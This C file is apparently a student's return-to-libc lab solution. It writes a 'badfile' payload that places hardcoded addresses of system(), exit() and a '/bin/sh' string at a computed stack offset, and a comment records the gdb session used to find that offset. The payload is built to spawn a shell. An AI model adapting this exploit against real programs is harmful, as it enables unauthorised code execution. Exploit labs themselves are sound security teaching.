#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
	char buf[200];
	FILE *badfile;
	memset(buf, 0xaa, 200);
	badfile = fopen("./badfile", "w");

	*(long *) &buf[70] = 0xbffffe1e ;
	*(long *) &buf[66] = 0xb7e369d0 ;
	*(long *) &buf[62] = 0xb7e42da0 ;

	badfile = fopen("./badfile", "w");
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
}


/*

in stack,
p system -> 0xb7e42da0
p exit -> 0xb7e369d0

env var address 0xbffffe1e

from stack_gdb
gdb-peda$ p &buffer
$1 = (char (*)[50]) 0xbfffebae
gdb-peda$ p $ebp
$2 = (void *) 0xbfffebe8
gdb-peda$ p/d 0xbfffebe8 - 0xbfffebae
$4 = 58


for this, 

58+4 goes to system's address
58+8 goes to exit's address
58+12 goes to env var "/bin/sh" 's address
*/
